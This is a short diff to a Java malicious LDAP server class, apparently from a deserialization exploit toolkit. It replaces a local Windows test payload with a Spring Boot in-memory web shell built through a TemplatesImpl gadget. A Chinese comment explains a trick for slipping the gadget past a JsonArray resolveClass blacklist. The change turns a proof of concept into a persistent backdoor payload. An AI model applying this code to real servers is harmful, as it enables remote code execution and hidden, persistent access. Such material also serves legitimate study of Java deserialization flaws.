@@ -13,6 +13,7 @@ import com.unboundid.ldap.sdk.Entry;
 import com.unboundid.ldap.sdk.LDAPResult;
 import com.unboundid.ldap.sdk.ResultCode;
 import gadget.doubleunser.MyInputStream;
+import gadget.memshell.SpringBootMemoryShellOfController;
 import javassist.ClassClassPath;
 import javassist.ClassPool;
 import javassist.CtClass;
@@ -109,7 +110,7 @@ public class ldapserver {
 
             List<Object> list = new ArrayList<>();
 
-            TemplatesImpl templates = GadgetUtils.templatesImplLocalWindows();
+            TemplatesImpl templates = GadgetUtils.createTemplatesImpl(SpringBootMemoryShellOfController.class);
 
             list.add(templates);          //第一次添加为了使得templates变成引用类型从而绕过JsonArray的resolveClass黑名单检测
 
